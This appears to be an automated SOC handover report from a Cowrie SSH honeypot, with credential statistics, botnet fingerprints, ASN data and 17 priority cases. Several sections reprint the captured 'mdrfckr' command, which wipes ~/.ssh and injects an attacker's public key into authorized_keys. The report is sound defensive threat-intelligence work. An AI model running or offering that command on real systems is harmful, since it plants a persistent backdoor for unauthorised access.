# 🛡 THIR · SOC Shift Handover Report

| Field | Value |
|---|---|
| **Report Date** | 2026-05-26 |
| **Generated At** | 2026-05-26T23:13:42Z |
| **Shift Time** | 23:13 UTC |
| **Honeypot Status** | ✅ HEALTHY |
| **Source** | Cowrie SSH Honeypot · AWS EC2 · Port 2222 |

---

## 📊 Executive Summary

| Metric | Value |
|---|---|
| Total Sessions Captured | **102** |
| Confirmed Threats | **100** |
| False Positives Filtered | **2** (2.0%) |
| Unique Attacker IPs | **10** |
| Countries of Origin | **7** |
| High Severity Cases | **17** |
| Medium Severity Cases | **0** |
| Low Severity Cases | **85** |
| Malware Samples Analyzed | **0** HIGH · **16** MED · 4 empty upload attempt(s) |

---

## 🔑 Credential Intelligence

| Metric | Value |
|---|---|
| Total Auth Attempts | **49** |
| Unique Credential Pairs | **34** |
| Unique Usernames | **24** |
| Unique Passwords | **33** |
| Successful Auth Pairs | **11** |

**Top Usernames:**

| Username | Attempts |
|---|---|
| `root` | 17 |
| `345gs5662d34` | 8 |
| `ubuntu` | 3 |
| `csgo` | 1 |
| `devops` | 1 |

**Top Passwords:**

| Password | Attempts |
|---|---|
| `345gs5662d34` | 8 |
| `3245gs5662d34` | 8 |
| `fjbdfdjkdsfs541544AA@@` | 2 |
| `12345678` | 2 |
| `r00tr00t` | 1 |

**Top Credential Pairs:**

| Username | Password | Attempts |
|---|---|---|
| `345gs5662d34` | `345gs5662d34` | 8 |
| `root` | `3245gs5662d34` | 8 |
| `ubuntu` | `fjbdfdjkdsfs541544AA@@` | 2 |
| `root` | `r00tr00t` | 1 |
| `csgo` | `csgo` | 1 |

**⚠️ Successful Auth Pairs (Priority — cross-reference with IR cases):**

| Username | Password | Source IP | Timestamp |
|---|---|---|---|
| `root` | `r00tr00t` | `186.148.224.83` | 2026-05-26T21:49:01 |
| `root` | `3245gs5662d34` | `186.148.224.83` | 2026-05-26T21:49:09 |
| `root` | `zxc123zxc` | `118.35.127.66` | 2026-05-26T22:12:05 |
| `root` | `3245gs5662d34` | `118.35.127.66` | 2026-05-26T22:12:09 |
| `root` | `Admin123..` | `118.35.127.66` | 2026-05-26T22:18:47 |
| `root` | `1234567@` | `118.35.127.66` | 2026-05-26T22:23:41 |
| `root` | `penis` | `118.35.127.66` | 2026-05-26T22:27:02 |
| `root` | `Yc@123456` | `118.35.127.66` | 2026-05-26T22:28:45 |
| `root` | `Admin123@` | `118.35.127.66` | 2026-05-26T22:33:47 |
| `root` | `ubuntu` | `192.3.252.25` | 2026-05-26T22:34:46 |
| `root` | `1q2w3e4r.` | `118.35.127.66` | 2026-05-26T22:35:26 |

---

## 🖥 SSH Fingerprint Intelligence

| Metric | Value |
|---|---|
| Total Sessions Parsed | **102** |
| Sessions with Fingerprint | **4** |
| Unique HASSH Fingerprints | **4** |

**Client Family Distribution:**

| Client Family | Sessions |
|---|---|
| libssh | 49 |
| Go SSH scanner | 2 |

**⚠️ Botnet/Scanner KEX Signatures Detected:**

| HASSH | Signature | Sessions | IPs |
|---|---|---|---|
| `f555226df196...` | Mirai/variant | 48 | 3 |
| `98ddc5604ef6...` | Modern SSH client | 1 | 1 |
| `873a5fb5fedc...` | Mirai/variant | 1 | 1 |

**Top Fingerprints:**

| HASSH | Client | Sessions | IPs | Botnet Sig |
|---|---|---|---|---|
| `f555226df196...` | libssh | 48 | 3 | Mirai/variant |
| `95420f9d932d...` | libssh | 1 | 1 | — |
| `98ddc5604ef6...` | Go SSH scanner | 1 | 1 | Modern SSH client |
| `873a5fb5fedc...` | Go SSH scanner | 1 | 1 | Mirai/variant |

---

## ⚔️ Attack Campaign Intelligence

| Metric | Value |
|---|---|
| Total Command Clusters | **1** |
| Campaign Clusters | **1** |
| Highest Severity | **HIGH** |

**Active Campaigns:**

| Campaign | Severity | Sessions | IPs | TTPs |
|---|---|---|---|---|
| **mdrfckr SSH Key Injection** | 🔴 HIGH | 8 | 2 | `T1021.004, T1078, T1070, T1140` |

**🔴 HIGH · mdrfckr SSH Key Injection**

> Backdoor SSH key injection campaign. Wipes existing authorized_keys and injects attacker public key.

Representative commands:
```
cd ~; chattr -ia .ssh; lockr -ia .ssh
```
```
cd ~ && rm -rf .ssh && mkdir .ssh && echo "ssh-rsa AAAAB3NzaC1yc2EAAAABJQAAAQEArDp4cun2lhr4KUhBGE7VvAcwdli2a8dbnrTOrbMz1+5O73fcBOx8NVbUT0bUanUV9tJ2/9p7+vD0EpZ3Tz/+0kX34uAx1RV/75GVOmNx+9EuWOnvNoaJe0QXxziIg9eLBHpgLMuakb5+BgTFB+rKJAw9u9FSTDengvS8hX1kNFS4Mjux0hJOK8rvcEmPecjdySYMb66nylAKGwCEE6WEQHmd1mUPgHwGQ0hWCwsQk13yCGPK5w6hYp5zYkFnvlC8hGmd4Ww+u97k6pfTGTUbJk14ujvcD9iUKQTTWYYjIIu5PmUux5bsZ0R4WFwdIe6+i6rBLAsPKgAySVKPRK+oRw== mdrfckr">>.ssh/authorized_keys && chmod -R go= ~/.ssh && cd ~
```
Source IPs: `186.148.224.83`, `118.35.127.66`

---

## 🌐 ASN Cluster Intelligence

| Metric | Value |
|---|---|
| Total IPs Analysed | **10** |
| Unique ASNs | **10** |
| High-Risk ASNs | **8** |
| Anon Infrastructure ASNs | **0** |

**Top Attack ASNs:**

| ASN | Provider | IPs | Risk |
|---|---|---|---|
| `AS19842` | Colosseum Online, Inc. | 1 | HIGH |
| `AS3816` | COLOMBIA TELECOMUNICACIONES S.A. ESP BIC | 1 | HIGH |
| `AS4766` | Korea Telecom | 1 | HIGH |
| `AS64123` | DODOLINK INTERNACIONAL SRL | 1 | HIGH |
| `AS36352` | HostPapa | 1 | HIGH |
| `AS14593` | Space Exploration Technologies Corporation | 1 | MEDIUM |
| `AS398324` | Censys, Inc. | 1 | HIGH |
| `AS137718` | Beijing Volcano Engine Technology Co., Ltd. | 1 | HIGH |

---

---

## 🚨 Priority Cases — Immediate Attention (17)

> Cases with auth success, command execution, or file downloads.
> Each requires individual review. Never grouped.

### 🔴 HIGH · IR-f7ae1a0d7f76

| Field | Detail |
|---|---|
| **Source IP** | `186.148.224[.]83` |
| **First Seen** | 2026-05-26 21:49 |
| **Last Seen** | 2026-05-26 21:49 |
| **Session Duration** | 10s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `cd ~; chattr -ia .ssh; lockr -ia .ssh, cd ~ && rm -rf .ssh && mkdir .ssh && echo "ssh-rsa AAAAB3NzaC1yc2EAAAABJQAAAQEArDp4cun2lhr4KUhBGE7VvAcwdli2a8dbnrTOrbMz1+5O73fcBOx8NVbUT0bUanUV9tJ2/9p7+vD0EpZ3Tz/+0kX34uAx1RV/75GVOmNx+9EuWOnvNoaJe0QXxziIg9eLBHpgLMuakb5+BgTFB+rKJAw9u9FSTDengvS8hX1kNFS4Mjux0hJOK8rvcEmPecjdySYMb66nylAKGwCEE6WEQHmd1mUPgHwGQ0hWCwsQk13yCGPK5w6hYp5zYkFnvlC8hGmd4Ww+u97k6pfTGTUbJk14ujvcD9iUKQTTWYYjIIu5PmUux5bsZ0R4WFwdIe6+i6rBLAsPKgAySVKPRK+oRw== mdrfckr">>.ssh/authorized_keys && chmod -R go= ~/.ssh && cd ~` |
| **Download Attempts** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 |
| **Malware Analysis** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 (LOW) |
| **TTPs (MITRE)** | T1021.004 · T1078 · T1105 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-05-26 21:49:00` | `cowrie.session.connect` |
| `2026-05-26 21:49:00` | `cowrie.client.version` |
| `2026-05-26 21:49:00` | `cowrie.client.kex` |
| `2026-05-26 21:49:01` | `cowrie.login.success` |
| `2026-05-26 21:49:02` | `cowrie.session.params` |
| `2026-05-26 21:49:02` | `cowrie.command.input` |
| `2026-05-26 21:49:02` | `cowrie.command.failed` |
| `2026-05-26 21:49:03` | `cowrie.log.closed` |
| `2026-05-26 21:49:03` | `cowrie.session.params` |
| `2026-05-26 21:49:03` | `cowrie.command.input` |
| `2026-05-26 21:49:04` | `cowrie.session.file_download` |
| `2026-05-26 21:49:04` | `cowrie.log.closed` |
| `2026-05-26 21:49:10` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `186.148.224[.]83` to AbuseIPDB if not already reported
- [ ] Block `186.148.224[.]83` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Submit download hash(es) to VirusTotal
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-aa3f9df4a880

| Field | Detail |
|---|---|
| **Source IP** | `186.148.224[.]83` |
| **First Seen** | 2026-05-26 21:49 |
| **Last Seen** | 2026-05-26 21:49 |
| **Session Duration** | 2s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-05-26 21:49:07` | `cowrie.session.connect` |
| `2026-05-26 21:49:07` | `cowrie.client.version` |
| `2026-05-26 21:49:08` | `cowrie.client.kex` |
| `2026-05-26 21:49:09` | `cowrie.login.success` |
| `2026-05-26 21:49:10` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `186.148.224[.]83` to AbuseIPDB if not already reported
- [ ] Block `186.148.224[.]83` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-c242cb825434

| Field | Detail |
|---|---|
| **Source IP** | `118.35.127[.]66` |
| **First Seen** | 2026-05-26 22:12 |
| **Last Seen** | 2026-05-26 22:12 |
| **Session Duration** | 4s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `cd ~; chattr -ia .ssh; lockr -ia .ssh, cd ~ && rm -rf .ssh && mkdir .ssh && echo "ssh-rsa AAAAB3NzaC1yc2EAAAABJQAAAQEArDp4cun2lhr4KUhBGE7VvAcwdli2a8dbnrTOrbMz1+5O73fcBOx8NVbUT0bUanUV9tJ2/9p7+vD0EpZ3Tz/+0kX34uAx1RV/75GVOmNx+9EuWOnvNoaJe0QXxziIg9eLBHpgLMuakb5+BgTFB+rKJAw9u9FSTDengvS8hX1kNFS4Mjux0hJOK8rvcEmPecjdySYMb66nylAKGwCEE6WEQHmd1mUPgHwGQ0hWCwsQk13yCGPK5w6hYp5zYkFnvlC8hGmd4Ww+u97k6pfTGTUbJk14ujvcD9iUKQTTWYYjIIu5PmUux5bsZ0R4WFwdIe6+i6rBLAsPKgAySVKPRK+oRw== mdrfckr">>.ssh/authorized_keys && chmod -R go= ~/.ssh && cd ~` |
| **Download Attempts** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 |
| **Malware Analysis** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 (LOW) |
| **TTPs (MITRE)** | T1021.004 · T1078 · T1105 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-05-26 22:12:05` | `cowrie.session.connect` |
| `2026-05-26 22:12:05` | `cowrie.client.version` |
| `2026-05-26 22:12:05` | `cowrie.client.kex` |
| `2026-05-26 22:12:05` | `cowrie.login.success` |
| `2026-05-26 22:12:06` | `cowrie.session.params` |
| `2026-05-26 22:12:06` | `cowrie.command.input` |
| `2026-05-26 22:12:06` | `cowrie.command.failed` |
| `2026-05-26 22:12:06` | `cowrie.log.closed` |
| `2026-05-26 22:12:06` | `cowrie.session.params` |
| `2026-05-26 22:12:06` | `cowrie.command.input` |
| `2026-05-26 22:12:06` | `cowrie.session.file_download` |
| `2026-05-26 22:12:06` | `cowrie.log.closed` |
| `2026-05-26 22:12:09` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `118.35.127[.]66` to AbuseIPDB if not already reported
- [ ] Block `118.35.127[.]66` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Submit download hash(es) to VirusTotal
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-f5e7cef1cc72

| Field | Detail |
|---|---|
| **Source IP** | `118.35.127[.]66` |
| **First Seen** | 2026-05-26 22:12 |
| **Last Seen** | 2026-05-26 22:12 |
| **Session Duration** | 0s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-05-26 22:12:08` | `cowrie.session.connect` |
| `2026-05-26 22:12:08` | `cowrie.client.version` |
| `2026-05-26 22:12:08` | `cowrie.client.kex` |
| `2026-05-26 22:12:09` | `cowrie.login.success` |
| `2026-05-26 22:12:09` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `118.35.127[.]66` to AbuseIPDB if not already reported
- [ ] Block `118.35.127[.]66` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-fd0d5dab36dd

| Field | Detail |
|---|---|
| **Source IP** | `118.35.127[.]66` |
| **First Seen** | 2026-05-26 22:18 |
| **Last Seen** | 2026-05-26 22:18 |
| **Session Duration** | 4s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `cd ~; chattr -ia .ssh; lockr -ia .ssh, cd ~ && rm -rf .ssh && mkdir .ssh && echo "ssh-rsa AAAAB3NzaC1yc2EAAAABJQAAAQEArDp4cun2lhr4KUhBGE7VvAcwdli2a8dbnrTOrbMz1+5O73fcBOx8NVbUT0bUanUV9tJ2/9p7+vD0EpZ3Tz/+0kX34uAx1RV/75GVOmNx+9EuWOnvNoaJe0QXxziIg9eLBHpgLMuakb5+BgTFB+rKJAw9u9FSTDengvS8hX1kNFS4Mjux0hJOK8rvcEmPecjdySYMb66nylAKGwCEE6WEQHmd1mUPgHwGQ0hWCwsQk13yCGPK5w6hYp5zYkFnvlC8hGmd4Ww+u97k6pfTGTUbJk14ujvcD9iUKQTTWYYjIIu5PmUux5bsZ0R4WFwdIe6+i6rBLAsPKgAySVKPRK+oRw== mdrfckr">>.ssh/authorized_keys && chmod -R go= ~/.ssh && cd ~` |
| **Download Attempts** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 |
| **Malware Analysis** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 (LOW) |
| **TTPs (MITRE)** | T1021.004 · T1078 · T1105 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-05-26 22:18:46` | `cowrie.session.connect` |
| `2026-05-26 22:18:46` | `cowrie.client.version` |
| `2026-05-26 22:18:46` | `cowrie.client.kex` |
| `2026-05-26 22:18:47` | `cowrie.login.success` |
| `2026-05-26 22:18:47` | `cowrie.session.params` |
| `2026-05-26 22:18:47` | `cowrie.command.input` |
| `2026-05-26 22:18:47` | `cowrie.command.failed` |
| `2026-05-26 22:18:47` | `cowrie.log.closed` |
| `2026-05-26 22:18:47` | `cowrie.session.params` |
| `2026-05-26 22:18:47` | `cowrie.command.input` |
| `2026-05-26 22:18:48` | `cowrie.session.file_download` |
| `2026-05-26 22:18:48` | `cowrie.log.closed` |
| `2026-05-26 22:18:51` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `118.35.127[.]66` to AbuseIPDB if not already reported
- [ ] Block `118.35.127[.]66` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Submit download hash(es) to VirusTotal
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-10b2fc79e37c

| Field | Detail |
|---|---|
| **Source IP** | `118.35.127[.]66` |
| **First Seen** | 2026-05-26 22:18 |
| **Last Seen** | 2026-05-26 22:18 |
| **Session Duration** | 0s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-05-26 22:18:50` | `cowrie.session.connect` |
| `2026-05-26 22:18:50` | `cowrie.client.version` |
| `2026-05-26 22:18:50` | `cowrie.client.kex` |
| `2026-05-26 22:18:50` | `cowrie.login.success` |
| `2026-05-26 22:18:51` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `118.35.127[.]66` to AbuseIPDB if not already reported
- [ ] Block `118.35.127[.]66` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-71744b98871c

| Field | Detail |
|---|---|
| **Source IP** | `118.35.127[.]66` |
| **First Seen** | 2026-05-26 22:23 |
| **Last Seen** | 2026-05-26 22:23 |
| **Session Duration** | 4s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `cd ~; chattr -ia .ssh; lockr -ia .ssh, cd ~ && rm -rf .ssh && mkdir .ssh && echo "ssh-rsa AAAAB3NzaC1yc2EAAAABJQAAAQEArDp4cun2lhr4KUhBGE7VvAcwdli2a8dbnrTOrbMz1+5O73fcBOx8NVbUT0bUanUV9tJ2/9p7+vD0EpZ3Tz/+0kX34uAx1RV/75GVOmNx+9EuWOnvNoaJe0QXxziIg9eLBHpgLMuakb5+BgTFB+rKJAw9u9FSTDengvS8hX1kNFS4Mjux0hJOK8rvcEmPecjdySYMb66nylAKGwCEE6WEQHmd1mUPgHwGQ0hWCwsQk13yCGPK5w6hYp5zYkFnvlC8hGmd4Ww+u97k6pfTGTUbJk14ujvcD9iUKQTTWYYjIIu5PmUux5bsZ0R4WFwdIe6+i6rBLAsPKgAySVKPRK+oRw== mdrfckr">>.ssh/authorized_keys && chmod -R go= ~/.ssh && cd ~` |
| **Download Attempts** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 |
| **Malware Analysis** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 (LOW) |
| **TTPs (MITRE)** | T1021.004 · T1078 · T1105 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-05-26 22:23:40` | `cowrie.session.connect` |
| `2026-05-26 22:23:40` | `cowrie.client.version` |
| `2026-05-26 22:23:40` | `cowrie.client.kex` |
| `2026-05-26 22:23:41` | `cowrie.login.success` |
| `2026-05-26 22:23:41` | `cowrie.session.params` |
| `2026-05-26 22:23:41` | `cowrie.command.input` |
| `2026-05-26 22:23:41` | `cowrie.command.failed` |
| `2026-05-26 22:23:42` | `cowrie.log.closed` |
| `2026-05-26 22:23:42` | `cowrie.session.params` |
| `2026-05-26 22:23:42` | `cowrie.command.input` |
| `2026-05-26 22:23:42` | `cowrie.session.file_download` |
| `2026-05-26 22:23:42` | `cowrie.log.closed` |
| `2026-05-26 22:23:45` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `118.35.127[.]66` to AbuseIPDB if not already reported
- [ ] Block `118.35.127[.]66` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Submit download hash(es) to VirusTotal
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-ac1921f0f3b5

| Field | Detail |
|---|---|
| **Source IP** | `118.35.127[.]66` |
| **First Seen** | 2026-05-26 22:23 |
| **Last Seen** | 2026-05-26 22:23 |
| **Session Duration** | 0s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-05-26 22:23:44` | `cowrie.session.connect` |
| `2026-05-26 22:23:44` | `cowrie.client.version` |
| `2026-05-26 22:23:44` | `cowrie.client.kex` |
| `2026-05-26 22:23:45` | `cowrie.login.success` |
| `2026-05-26 22:23:45` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `118.35.127[.]66` to AbuseIPDB if not already reported
- [ ] Block `118.35.127[.]66` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-37e5679d914e

| Field | Detail |
|---|---|
| **Source IP** | `118.35.127[.]66` |
| **First Seen** | 2026-05-26 22:27 |
| **Last Seen** | 2026-05-26 22:27 |
| **Session Duration** | 4s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `cd ~; chattr -ia .ssh; lockr -ia .ssh, cd ~ && rm -rf .ssh && mkdir .ssh && echo "ssh-rsa AAAAB3NzaC1yc2EAAAABJQAAAQEArDp4cun2lhr4KUhBGE7VvAcwdli2a8dbnrTOrbMz1+5O73fcBOx8NVbUT0bUanUV9tJ2/9p7+vD0EpZ3Tz/+0kX34uAx1RV/75GVOmNx+9EuWOnvNoaJe0QXxziIg9eLBHpgLMuakb5+BgTFB+rKJAw9u9FSTDengvS8hX1kNFS4Mjux0hJOK8rvcEmPecjdySYMb66nylAKGwCEE6WEQHmd1mUPgHwGQ0hWCwsQk13yCGPK5w6hYp5zYkFnvlC8hGmd4Ww+u97k6pfTGTUbJk14ujvcD9iUKQTTWYYjIIu5PmUux5bsZ0R4WFwdIe6+i6rBLAsPKgAySVKPRK+oRw== mdrfckr">>.ssh/authorized_keys && chmod -R go= ~/.ssh && cd ~` |
| **Download Attempts** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 |
| **Malware Analysis** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 (LOW) |
| **TTPs (MITRE)** | T1021.004 · T1078 · T1105 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-05-26 22:27:01` | `cowrie.session.connect` |
| `2026-05-26 22:27:01` | `cowrie.client.version` |
| `2026-05-26 22:27:01` | `cowrie.client.kex` |
| `2026-05-26 22:27:02` | `cowrie.login.success` |
| `2026-05-26 22:27:02` | `cowrie.session.params` |
| `2026-05-26 22:27:02` | `cowrie.command.input` |
| `2026-05-26 22:27:02` | `cowrie.command.failed` |
| `2026-05-26 22:27:02` | `cowrie.log.closed` |
| `2026-05-26 22:27:02` | `cowrie.session.params` |
| `2026-05-26 22:27:02` | `cowrie.command.input` |
| `2026-05-26 22:27:03` | `cowrie.session.file_download` |
| `2026-05-26 22:27:03` | `cowrie.log.closed` |
| `2026-05-26 22:27:06` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `118.35.127[.]66` to AbuseIPDB if not already reported
- [ ] Block `118.35.127[.]66` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Submit download hash(es) to VirusTotal
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-1ccf066eb328

| Field | Detail |
|---|---|
| **Source IP** | `118.35.127[.]66` |
| **First Seen** | 2026-05-26 22:27 |
| **Last Seen** | 2026-05-26 22:27 |
| **Session Duration** | 0s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-05-26 22:27:05` | `cowrie.session.connect` |
| `2026-05-26 22:27:05` | `cowrie.client.version` |
| `2026-05-26 22:27:05` | `cowrie.client.kex` |
| `2026-05-26 22:27:05` | `cowrie.login.success` |
| `2026-05-26 22:27:06` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `118.35.127[.]66` to AbuseIPDB if not already reported
- [ ] Block `118.35.127[.]66` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-94cb9c269d94

| Field | Detail |
|---|---|
| **Source IP** | `118.35.127[.]66` |
| **First Seen** | 2026-05-26 22:28 |
| **Last Seen** | 2026-05-26 22:28 |
| **Session Duration** | 4s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `cd ~; chattr -ia .ssh; lockr -ia .ssh, cd ~ && rm -rf .ssh && mkdir .ssh && echo "ssh-rsa AAAAB3NzaC1yc2EAAAABJQAAAQEArDp4cun2lhr4KUhBGE7VvAcwdli2a8dbnrTOrbMz1+5O73fcBOx8NVbUT0bUanUV9tJ2/9p7+vD0EpZ3Tz/+0kX34uAx1RV/75GVOmNx+9EuWOnvNoaJe0QXxziIg9eLBHpgLMuakb5+BgTFB+rKJAw9u9FSTDengvS8hX1kNFS4Mjux0hJOK8rvcEmPecjdySYMb66nylAKGwCEE6WEQHmd1mUPgHwGQ0hWCwsQk13yCGPK5w6hYp5zYkFnvlC8hGmd4Ww+u97k6pfTGTUbJk14ujvcD9iUKQTTWYYjIIu5PmUux5bsZ0R4WFwdIe6+i6rBLAsPKgAySVKPRK+oRw== mdrfckr">>.ssh/authorized_keys && chmod -R go= ~/.ssh && cd ~` |
| **Download Attempts** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 |
| **Malware Analysis** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 (LOW) |
| **TTPs (MITRE)** | T1021.004 · T1078 · T1105 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-05-26 22:28:44` | `cowrie.session.connect` |
| `2026-05-26 22:28:44` | `cowrie.client.version` |
| `2026-05-26 22:28:44` | `cowrie.client.kex` |
| `2026-05-26 22:28:45` | `cowrie.login.success` |
| `2026-05-26 22:28:45` | `cowrie.session.params` |
| `2026-05-26 22:28:45` | `cowrie.command.input` |
| `2026-05-26 22:28:45` | `cowrie.command.failed` |
| `2026-05-26 22:28:46` | `cowrie.log.closed` |
| `2026-05-26 22:28:46` | `cowrie.session.params` |
| `2026-05-26 22:28:46` | `cowrie.command.input` |
| `2026-05-26 22:28:46` | `cowrie.session.file_download` |
| `2026-05-26 22:28:46` | `cowrie.log.closed` |
| `2026-05-26 22:28:49` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `118.35.127[.]66` to AbuseIPDB if not already reported
- [ ] Block `118.35.127[.]66` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Submit download hash(es) to VirusTotal
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-e00e5d9647d7

| Field | Detail |
|---|---|
| **Source IP** | `118.35.127[.]66` |
| **First Seen** | 2026-05-26 22:28 |
| **Last Seen** | 2026-05-26 22:28 |
| **Session Duration** | 0s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-05-26 22:28:48` | `cowrie.session.connect` |
| `2026-05-26 22:28:48` | `cowrie.client.version` |
| `2026-05-26 22:28:48` | `cowrie.client.kex` |
| `2026-05-26 22:28:49` | `cowrie.login.success` |
| `2026-05-26 22:28:49` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `118.35.127[.]66` to AbuseIPDB if not already reported
- [ ] Block `118.35.127[.]66` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-03b887583ae8

| Field | Detail |
|---|---|
| **Source IP** | `118.35.127[.]66` |
| **First Seen** | 2026-05-26 22:33 |
| **Last Seen** | 2026-05-26 22:33 |
| **Session Duration** | 4s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `cd ~; chattr -ia .ssh; lockr -ia .ssh, cd ~ && rm -rf .ssh && mkdir .ssh && echo "ssh-rsa AAAAB3NzaC1yc2EAAAABJQAAAQEArDp4cun2lhr4KUhBGE7VvAcwdli2a8dbnrTOrbMz1+5O73fcBOx8NVbUT0bUanUV9tJ2/9p7+vD0EpZ3Tz/+0kX34uAx1RV/75GVOmNx+9EuWOnvNoaJe0QXxziIg9eLBHpgLMuakb5+BgTFB+rKJAw9u9FSTDengvS8hX1kNFS4Mjux0hJOK8rvcEmPecjdySYMb66nylAKGwCEE6WEQHmd1mUPgHwGQ0hWCwsQk13yCGPK5w6hYp5zYkFnvlC8hGmd4Ww+u97k6pfTGTUbJk14ujvcD9iUKQTTWYYjIIu5PmUux5bsZ0R4WFwdIe6+i6rBLAsPKgAySVKPRK+oRw== mdrfckr">>.ssh/authorized_keys && chmod -R go= ~/.ssh && cd ~` |
| **Download Attempts** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 |
| **Malware Analysis** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 (LOW) |
| **TTPs (MITRE)** | T1021.004 · T1078 · T1105 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-05-26 22:33:46` | `cowrie.session.connect` |
| `2026-05-26 22:33:46` | `cowrie.client.version` |
| `2026-05-26 22:33:46` | `cowrie.client.kex` |
| `2026-05-26 22:33:47` | `cowrie.login.success` |
| `2026-05-26 22:33:47` | `cowrie.session.params` |
| `2026-05-26 22:33:47` | `cowrie.command.input` |
| `2026-05-26 22:33:47` | `cowrie.command.failed` |
| `2026-05-26 22:33:47` | `cowrie.log.closed` |
| `2026-05-26 22:33:47` | `cowrie.session.params` |
| `2026-05-26 22:33:47` | `cowrie.command.input` |
| `2026-05-26 22:33:48` | `cowrie.session.file_download` |
| `2026-05-26 22:33:48` | `cowrie.log.closed` |
| `2026-05-26 22:33:51` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `118.35.127[.]66` to AbuseIPDB if not already reported
- [ ] Block `118.35.127[.]66` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Submit download hash(es) to VirusTotal
- [ ] Escalate to Tier 2 if pattern repeats next shift

